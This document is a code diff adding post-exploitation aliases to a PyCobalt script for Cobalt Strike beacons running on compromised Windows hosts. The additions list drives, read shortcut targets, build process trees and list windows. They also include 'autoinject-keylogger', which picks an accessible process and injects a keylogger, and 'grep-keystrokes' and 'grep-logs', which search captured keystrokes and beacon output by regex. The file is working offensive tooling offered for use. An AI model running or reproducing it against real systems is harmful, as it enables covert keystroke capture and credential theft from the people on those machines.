@@ -5,16 +5,18 @@ import sys
 import os
 sys.path.insert(0, os.path.realpath(os.path.dirname(__file__)) + '/..')
 
+import re
 import textwrap
+import datetime
 import collections
 
 import pycobalt.engine as engine
 import pycobalt.events as events
-import pycobalt.commands as commands
 import pycobalt.aliases as aliases
+import pycobalt.helpers as helpers
+import pycobalt.commands as commands
 import pycobalt.aggressor as aggressor
 import pycobalt.callbacks as callbacks
-import pycobalt.helpers as helpers
 
 @aliases.alias('pp', 'Alias for powerpick')
 def _(bid, *args):
@@ -74,6 +76,27 @@ def _(bid, *args):
 def _(bid):
     aggressor.bpowerpick(bid, 'Get-PSDrive')
 
+@aliases.alias('drive-list', 'Run ls in each drive')
+def _(bid):
+    aggressor.btask(bid, 'Tasked beacon to list files at root of each drive')
+    aggressor.bpowerpick(bid, 'Get-PSDrive -PSProvider Filesystem | ForEach-Object { ls $_.root; }')
+
+@aliases.alias('readlink', 'Show .lnk location and arguments')
+def _(bid, *lnks):
+    command = '$sh = New-Object -ComObject WScript.Shell'
+
+    for lnk in lnks:
+        command += textwrap.dedent(r"""
+            $shortcut = $sh.CreateShortcut({})
+            #$target = $shortcut.TargetPath
+            #$arguments = $target.Arguments
+            #echo "$target $arguments"
+            echo "$shortcut.TargetPath $target.Arguments"
+            """.format(powershell_quote(lnk)))
+
+    aggressor.btask(bid, 'Tasked beacon to read links: {}'.format(', '.join(lnks)))
+    aggressor.bpowerpick(bid, command, silent=True)
+
 @aliases.alias('pb', 'Open process browser')
 def _(bid):
     aggressor.openProcessBrowser(bid)
@@ -85,6 +108,23 @@ def _(bid):
         out += ' - {}: {}\n'.format(key, value)
 
     aggressor.blog2(bid, out)
+
+@aliases.alias('loaded', 'Show loaded powershell modules')
+def _(bid):
+    loaded = aggressor.data_query('cmdlets')
+    if bid in loaded:
+        out = 'Loaded modules:\n'
+        for module in loaded[bid]:
+            if module.lower() in ['local', 'that', 'struct', 'field', 'before',
+                                  'psenum', 'func', '']:
+                # not sure what these are
+                continue
+
+            out += ' - {}\n'.format(module)
+
+        aggressor.blog2(bid, out)
+    else:
+        aggressor.berror(bid, 'No loaded modules')
 
 jobkillall_items = collections.defaultdict(list)
 
@@ -170,6 +210,18 @@ def _(bid, *dirs):
     for d in dirs:
         aggressor.bls(bid, d)
 
+@aliases.alias('la', 'Run ls within all subdirectories of a directory')
+def _(bid, *dirs):
+    # default dir is .
+    if not dirs:
+        dirs = ['.']
+
+    command = 'ls '
+    command += ', '.join([powershell_quote('{}\*\*'.format(d)) for d in dirs])
+
+    aggressor.btask(bid, 'Tasked beacon to list */* in: {}'.format(', '.join(dirs)))
+    aggressor.bpowerpick(bid, command, silent=True)
+
 @aliases.alias('remove', 'Remove this beacon')
 def _(bid):
     aggressor.beacon_remove(bid)
@@ -201,7 +253,7 @@ def _(bid, fname):
 def _(bid, local_file, remote_file):
     helpers.upload_to(bid, local_file, remote_file)
 
-@aliases.alias('lst', 'List files, sorted by time')
+@aliases.alias('lt', 'List files, sorted by time')
 def _(bid, *dirs):
     # default dir is .
     if not dirs:
@@ -292,5 +344,227 @@ def _(bid):
     user = aggressor.binfo(bid, 'user')
     home = r'c:\users\{}'.format(user)
     aggressor.bcd(bid, home)
+
+@aliases.alias('pstree', 'Make process tree')
+def _(bid):
+    def ps_callback(bid, content):
+        procs = helpers.parse_ps(content)
+
+        def get_children(pid):
+            ret = []
+            for proc in procs:
+                if proc['ppid'] == pid and proc['pid'] != pid:
+                    ret.append(proc)
+            return ret
+
+        def get_trunks(procs):
+            all_pids = [proc['pid'] for proc in procs]
+            ret = []
+            for proc in procs:
+                if proc['ppid'] not in all_pids or proc['ppid'] == proc['pid']:
+                    ret.append(proc)
+            return ret
+
+        def make_tree(proc, indent=0):
+            # output proc info
+            output = ''
+            output += ' ' * indent + '{} (pid {})'.format(proc['name'], proc['pid'])
+            if 'arch' in proc:
+                output += ' (arch {})'.format(proc['arch'])
+            if 'user' in proc:
+                output += ' (user {})'.format(proc['user'])
+
+            # add app description
+            exe = proc['name'].lower() 
+            output += '\n'
+
+            # recurse children
+            children = get_children(proc['pid'])
+            #aggressor.blog2(bid, 'recursing {} children of {}'.format(len(children), str(proc)))
+            #aggressor.blog2(bid, str(children))
+            for child in children:
+                output += make_tree(child, indent + 4)
+
+            return output
+
+        # start with process 0
+        tree = ''
+        for trunk in get_trunks(procs):
+            tree += make_tree(trunk)
+        aggressor.blog2(bid, 'Process tree:\n' + tree)
+
+    aggressor.btask(bid, 'Tasked beacon to make a process tree')
+    aggressor.bps(bid, ps_callback)
+
+@aliases.alias('windows', 'Show windows')
+def _(bid):
+    command = textwrap.dedent(r"""
+    Get-Process |
+        Where { $_.mainWindowTitle } |
+        Format-Table id,name,mainwindowtitle -AutoSize
+    """)
+    
+    aggressor.btask(bid, 'Tasked beacon to list open windows')
+    aggressor.bpowerpick(bid, command, silent=True)
+
+@aliases.alias('autoinject-keylogger', 'Find a suitable process and inject keylogger')
+def _(bid, proc_name=None):
+    def parsed_callback(procs):
+        for proc in procs:
+            if 'arch' in proc and 'user' in proc:
+                # inject it
+                aggressor.blog(bid, 'Keylogging process {} ({} {})'.format(proc['name'], proc['pid'], proc['arch']))
+                aggressor.bkeylogger(bid, proc['pid'], proc['arch'], silent=True)
+                return
+
+        # nothing found
+        if proc_name:
+            aggressor.berror("Didn't find any processes named '{}' to inject keylogger".format(proc_name))
+        else:
+            aggressor.berror("Didn't find any processes to inject keylogger")
+
+    def ps_callback(bid, content):
+        procs = helpers.parse_ps(content)
+        parsed_callback(procs)
+
+    if proc_name:
+        aggressor.blog2(bid, 'Tasked beacon to keylog first accessible process named {}'.format(proc_name))
+        helpers.find_process(bid, proc_name, parsed_callback)
+    else:
+        aggressor.btask(bid, 'Tasked beacon to keylog first accessible process')
+        aggressor.bps(bid, ps_callback)
+
+def convert_time(time):
+    """
+    Convert data model time to pretty time
+    """
+
+    return datetime.datetime.utcfromtimestamp(int(str(time)[:-3])).strftime('%Y-%m-%d %H:%M:%S')
+
+def split_output(output):
+    """
+    Split up a piece of beacon output based on the [+] prefixes.
+    """
+
+    lines = output.splitlines()
+    ret = []
+    current = None
+    for line in lines:
+        if not current:
+            current = line + '\n'
+
+        if line.startswith('[*]') or line.startswith('[+]') or line.startswith('[!]'):
+            if current:
+                ret.append(current)
+            current = line + '\n'
+        else:
+            current += line + '\n'
+
+    return ret
+
+# Grep keystrokes for a regex
+@commands.command('grep-keystrokes')
+def _(regex):
+    found = False
+    engine.message("Searching keystrokes for '{}'".format(regex))
+    for frame in aggressor.data_query('keystrokes'):
+        data = frame['data']
+        bid = frame['bid']
+        time = convert_time(frame['when'])
+        beacon = '{}@{}'.format(aggressor.beacon_info(bid, 'user'), aggressor.beacon_info(bid, 'computer'))
+
+        for line in data.splitlines():
+            if re.search(regex, line, re.IGNORECASE):
+                engine.message("Found keystroke matching '{}' from {} at {}: {}".format(regex, beacon, time, line))
+                found = True
+
+    if not found:
+        engine.error("Didn't find any keystrokes containing '{}'".format(regex))
+
+# Get logs for user or computer
+@commands.command('logs')
+def _(*args):
+    parser = helpers.ArgumentParser(prog='logs', description='Get logs for a user or computer')
+    parser.add_argument('-c', '--computer', help='Get logs for computer')
+    parser.add_argument('-u', '--user', help='Get logs for user')
+    parser.add_argument('out', help='Output file')
+    try: args = parser.parse_args(args)
+    except: return
+
+    finds = 0
+    for frame in aggressor.data_query('beaconlog'):
+        output_type = frame[0]
+        bid = frame[1]
+        if output_type == 'beacon_input':
+            user = frame[2]
+            data = frame[3]
+            time = convert_time(frame[4])
+        else:
+            data = frame[2]
+            time = convert_time(frame[3])
+
+        user = aggressor.beacon_info(bid, 'user')
+        computer = aggressor.beacon_info(bid, 'computer')
+
+        if user == args.user or computer == args.computer:
+            # it's a match!
+            finds += 1
+
+            # -o/--out
+            with open(args.out, 'a+') as fp:
+                fp.write(data)
+
+    engine.message('Wrote {} finds to {}'.format(finds, args.out))
+
+# Grep beacon logs for a regex
+@commands.command('grep-logs')
+def _(*args):
+    parser = helpers.ArgumentParser(prog='grep-logs', description='Grep beacon logs for a regex')
+    parser.add_argument('-o', '--out', help='Output file')
+    parser.add_argument('-w', '--whole', action='store_true', help='Show whole output')
+    parser.add_argument('regex', action='append', help='Search for regex')
+    try: args = parser.parse_args(args)
+    except: return
+
+    for regex in args.regex:
+        finds = 0
+        engine.message("Searching beacon logs for '{}'".format(regex))
+        for frame in aggressor.data_query('beaconlog'):
+            output_type = frame[0]
+            bid = frame[1]
+            if output_type == 'beacon_input':
+                user = frame[2]
+                data = frame[3]
+                time = convert_time(frame[4])
+            else:
+                data = frame[2]
+                time = convert_time(frame[3])
+
+            for log in split_output(data):
+                if re.search(regex, log, re.IGNORECASE):
+                    beacon = '{}@{}'.format(aggressor.beacon_info(bid, 'user'), aggressor.beacon_info(bid, 'computer'))
+
+                    # -w/--whole
+                    if args.whole:
+                        output = data
+                    else:
+                        output = log
+
+                    # -o/--out
+                    if args.out:
+                        with open(args.out, 'a+') as fp:
+                            fp.write(output)
+                    else:
+                        engine.message("Found beacon log matching '{}' from {} at {}:\n{}".format(regex, beacon, time, output))
+
+                    finds += 1
+
+        if finds:
+            if args.out:
+                engine.message("Wrote {} finds containing '{}' to '{}'".format(finds, regex, args.out))
+            else:
+                engine.message("Found {} logs containing '{}'".format(finds, regex))
+        else:
+            engine.error("Didn't find any beacon logs containing '{}'".format(regex))
 
 engine.loop()
